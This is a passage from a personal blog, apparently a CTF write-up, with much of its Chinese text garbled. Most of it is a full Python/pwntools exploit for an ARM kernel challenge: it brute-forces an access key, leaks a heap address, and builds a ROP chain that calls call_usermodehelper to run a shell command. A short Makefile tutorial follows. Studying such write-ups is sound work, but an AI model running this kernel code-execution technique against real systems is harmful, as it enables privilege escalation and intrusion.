class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125; &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+sl),stack+<span class="number">4</span>*<span class="number">30</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;                  &lt;0x8010c040&gt;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">33</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">37</span>)  <span class="comment">#pc</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">38</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80101524</span>),stack+<span class="number">4</span>*<span class="number">39</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80101524 &lt;secondary_startup_arm+100&gt;    mov    sp, ip</span></span><br><span class="line"><span class="string">    0x80101528 &lt;secondary_startup_arm+104&gt;    ldr    ip, [sl, #0x10]</span></span><br><span class="line"><span class="string">    0x8010152c &lt;secondary_startup_arm+108&gt;    add    ip, ip, sl</span></span><br><span class="line"><span class="string">    0x80101530 &lt;secondary_startup_arm+112&gt;    mov    pc, ip</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    offsets=(call_usermodehelper-(heap+sl))&amp;<span class="number">0xffffffff</span></span><br><span class="line">    payload=str_change(payload,p32(offsets),sl+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç®€åŒ–ç‰ˆ</p>
<p>ä¹Ÿå°±ç®€åŒ–äº†20è¡ŒğŸ˜¢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">        tmp_key=key+<span class="built_in">chr</span>(j)</span><br><span class="line">        tmp_key=tmp_key.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">        <span class="comment"># sh = process([&#x27;./wscat&#x27;, &#x27;--endpoint&#x27;, &#x27;wss://telnet.2022.capturetheflag.fun/ws/&#x27; + CHALLENGE_ID])</span></span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">        sh.send(tmp_key)</span><br><span class="line">        m=sh.recv(<span class="number">15</span>)</span><br><span class="line">        <span class="built_in">print</span> m</span><br><span class="line">        <span class="keyword">if</span> m == <span class="string">&#x27;auth success!!!&#x27;</span>:</span><br><span class="line">            key_flag=<span class="number">1</span></span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.recv(<span class="number">16</span>)</span><br><span class="line">        ture_num=u8(sh.recv(<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ture_num-<span class="number">1</span>==i:</span><br><span class="line">            key+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sh.close()</span><br><span class="line">    <span class="keyword">if</span> key_flag ==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server</span>(<span class="params">opt,<span class="built_in">len</span>=<span class="number">0</span>,context=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    sh=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello server\n&quot;</span>)</span><br><span class="line">    sh.send(opt)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x30&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]this is puredata\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt==<span class="string">&#x27;\x10&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]say hello\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    <span class="keyword">if</span> opt ==<span class="string">&#x27;\x20&#x27;</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;[+]do opt func\n&quot;</span>)</span><br><span class="line">        sh.send(p16(<span class="built_in">len</span>))</span><br><span class="line">        sh.send(context)</span><br><span class="line">    sh.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span>():</span></span><br><span class="line">    sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2325</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+] has access key?\n&quot;</span>)</span><br><span class="line">    sh.send(key)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;server or client ?&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;[+]hello client\n&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line">    sh.recv()</span><br><span class="line">    data=sh.recv()</span><br><span class="line">    sh.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_change</span>(<span class="params">payload,<span class="built_in">str</span>,idx</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload[<span class="number">0</span>:idx]+<span class="built_in">str</span>+payload[idx+<span class="built_in">len</span>(<span class="built_in">str</span>):]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop</span>(<span class="params">heap,cmd</span>):</span>    <span class="comment"># server(&quot;\x10&quot;,1,&#x27;b&#x27;)</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x2000</span></span><br><span class="line">    stack=<span class="number">0x1000</span></span><br><span class="line">    save_sp=<span class="number">0x1500</span></span><br><span class="line">    agr=<span class="number">0x1700</span></span><br><span class="line">    sl=<span class="number">0x1800</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;/bin/sh\x00&quot;</span>,agr)</span><br><span class="line">    payload=str_change(payload,<span class="string">&quot;-c&quot;</span>,agr+<span class="number">0x10</span>)</span><br><span class="line">    payload=str_change(payload,cmd,agr+<span class="number">0x20</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr),agr+<span class="number">0x100</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x10</span>),agr+<span class="number">0x100</span>+<span class="number">4</span>)</span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x20</span>),agr+<span class="number">0x100</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8051ef90:	ldr	r3, [r0, #400]	; 0x190</span></span><br><span class="line"><span class="string">    0x8051ef94:	ldr	r2, [r3, #124]	; 0x7c</span></span><br><span class="line"><span class="string">    0x8051ef98:	cmp	r2, #0</span></span><br><span class="line"><span class="string">    0x8051ef9c:	beq	0x8051efb0</span></span><br><span class="line"><span class="string">    0x8051efa0:	blx	r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x190</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8049dd4c</span>),<span class="number">0x7c</span>)  <span class="comment">#r2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8049dd4c &lt;hvc_push+12&gt;    ldr    r2, [r0, #0xec]</span></span><br><span class="line"><span class="string">    0x8049dd50 &lt;hvc_push+16&gt;    ldr    r1, [r0, #0xe4]</span></span><br><span class="line"><span class="string">    0x8049dd54 &lt;hvc_push+20&gt;    ldr    r3, [r3, #4]</span></span><br><span class="line"><span class="string">    0x8049dd58 &lt;hvc_push+24&gt;    ldr    r0, [r0, #0xf0]</span></span><br><span class="line"><span class="string">    0x8049dd5c &lt;hvc_push+28&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x802d4d18</span>),<span class="number">0xec</span>)  <span class="comment">#r2</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0xe4</span>)  <span class="comment">#r1</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0x4</span>)  <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80694958</span>),<span class="number">0xf0</span>)  <span class="comment">#r0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80694958 &lt;rpcauth_list_flavors+76&gt;     mov    r0, sp</span></span><br><span class="line"><span class="string">    0x8069495c &lt;rpcauth_list_flavors+80&gt;     blx    r2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x802d4d18 &lt;nfs_pgio_result+8&gt;     ldr    r3, [r1, #0x3c]</span></span><br><span class="line"><span class="string">    0x802d4d1c &lt;nfs_pgio_result+12&gt;    mov    r5, r0</span></span><br><span class="line"><span class="string">    0x802d4d20 &lt;nfs_pgio_result+16&gt;    ldr    r2, [r1]</span></span><br><span class="line"><span class="string">    0x802d4d24 &lt;nfs_pgio_result+20&gt;    ldr    r3, [r3, #0xc]</span></span><br><span class="line"><span class="string">    0x802d4d28 &lt;nfs_pgio_result+24&gt;    blx    r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap),<span class="number">0x3c</span>) <span class="comment">#r3</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack),<span class="number">0</span>)  <span class="comment"># r2</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c03c</span>),<span class="number">0xc</span>) <span class="comment">#r3</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c03c &lt;cpu_suspend_abort+12&gt;         mov    sp, r2</span></span><br><span class="line"><span class="string">    0x8010c040 &lt;cpu_suspend_abort+16&gt;         pop    &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+stack+<span class="number">4</span>*<span class="number">20</span>),stack)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8017c0f0</span>),stack+<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8017c0f0 &lt;tick_handover_do_timer+76&gt;    str    r0, [r4]</span></span><br><span class="line"><span class="string">    0x8017c0f4 &lt;tick_handover_do_timer+80&gt;    pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x804282e4</span>),stack+<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x804282e4                                pop    &#123;r1, r2, r3&#125;</span></span><br><span class="line"><span class="string">    0x804282e8                                sub    r0, r0, r1</span></span><br><span class="line"><span class="string">    0x804282ec                                rsb    r0, r0, r2</span></span><br><span class="line"><span class="string">    0x804282f0                                pop    &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr+<span class="number">0x100</span>),stack+<span class="number">4</span>*<span class="number">11</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80427e38</span>),stack+<span class="number">4</span>*<span class="number">13</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x8010c020</span>),stack+<span class="number">4</span>*<span class="number">15</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x8010c020 &lt;__cpu_suspend+96&gt;             pop    &#123;r0, pc&#125;                      &lt;0x8010c020&gt;=</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=str_change(payload,p32(heap+agr),stack+<span class="number">4</span>*<span class="number">16</span>)</span><br><span class="line">    payload=str_change(payload,p32(<span class="number">0x80136dec</span>),stack+<span class="number">4</span>*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80136dec &lt;module_attr_show+32&gt;          pop    &#123;lr&#125;</span></span><br><span class="line"><span class="string">    0x80136df0 &lt;module_attr_show+36&gt;          bx     r3</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    call_usermodehelper=<span class="number">0x8012f990</span></span><br><span class="line">    payload=str_change(payload,p32(call_usermodehelper),stack+<span class="number">4</span>*<span class="number">18</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0x80427e38 &lt;call_with_stack+32&gt;:	ldr	sp, [sp, #4]</span></span><br><span class="line"><span class="string">    0x80427e3c &lt;call_with_stack+36&gt;:	bx	lr</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        server(<span class="string">&#x27;\x20&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        client()</span><br><span class="line">    </span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">    client()</span><br><span class="line">    client()</span><br><span class="line">    data=client()</span><br><span class="line">    heap=u32(data[<span class="number">7</span>:<span class="number">7</span>+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">    cmd=<span class="string">&#x27;echo hello1 &gt; /tmp/hacked&#x27;</span></span><br><span class="line">    payload=rop(heap,cmd)</span><br><span class="line">    server(<span class="string">&#x27;\x10&#x27;</span>,<span class="number">0x2000</span>,payload)</span><br><span class="line"></span><br><span class="line">    payload=p32(<span class="number">0x8051ef90</span>)+p32(heap)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1000</span>+<span class="number">0xfff</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    server(<span class="string">&#x27;\x30&#x27;</span>,<span class="number">0x1ffc</span>,payload)</span><br><span class="line">    client()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¯¹æ ‡å¿—æ§åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´çš„æ¼æ´ç±»å‹æœ‰äº†æ¯”è¾ƒæ·±åˆ»çš„å°è±¡ï¼Œäº†è§£å­¦ä¹ äº†armæŒ‡ä»¤é›†ä»¥åŠå¯»æ‰¾gadgetçš„æ€è·¯ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/08/makefile/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/08/makefile/" class="post-title-link" itemprop="url">makefile</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-09-08 17:15:57 / ä¿®æ”¹æ—¶é—´ï¼š17:16:13" itemprop="dateCreated datePublished" datetime="2022-09-08T17:15:57+08:00">2022-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Makefileå­¦ä¹ "><a href="#Makefileå­¦ä¹ " class="headerlink" title="Makefileå­¦ä¹ "></a>Makefileå­¦ä¹ </h1><p>ä¹‹å‰åªæ˜¯ç•¥æœ‰äº†è§£ï¼Œæ„Ÿè§‰ååˆ†æ–¹ä¾¿ï¼Œæ‰€ä»¥æƒ³æ·±å…¥äº†è§£ä¸€ä¸‹ã€‚</p>
<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>Makefileæ˜¯ä¸€ä¸ªè§„åˆ™æ–‡ä»¶ï¼Œmakeæ˜¯ä¸€ä¸ªç¨‹åºï¼Œåœ¨å‘½ä»¤è¡Œé”®å…¥makeåï¼Œmakeè‡ªåŠ¨æ‰¾è§Makefileæ¥è§£æå…¶ä¸­çš„è§„åˆ™æ¥å®Œæˆç¼–è¯‘å·¥ä½œã€‚</p>
<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello-world"></a>hello-world</h2><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907185029578.png" alt="image-20220907185029578"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:</span><br><span class="line">	@echo &quot;hello world&quot;</span><br><span class="line">	@ls ./</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">Makefile</span><br></pre></td></tr></table></figure>

<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">a:</span></span><br><span class="line">	@echo <span class="string">&quot;hello world&quot;</span></span><br><span class="line">	@ls ./</span><br><span class="line">	gcc main.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	@rm -rf a.out</span><br><span class="line">	@echo <span class="string">&quot;a.out del success&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make</span><br><span class="line">hello world</span><br><span class="line">main.c	Makefile</span><br><span class="line">gcc main.c</span><br><span class="line">os@os-virtual-machine:~/makefilestudy/1$ make clean</span><br><span class="line">a.out del success</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220907190203085.png" alt="image-20220907190203085"></p>
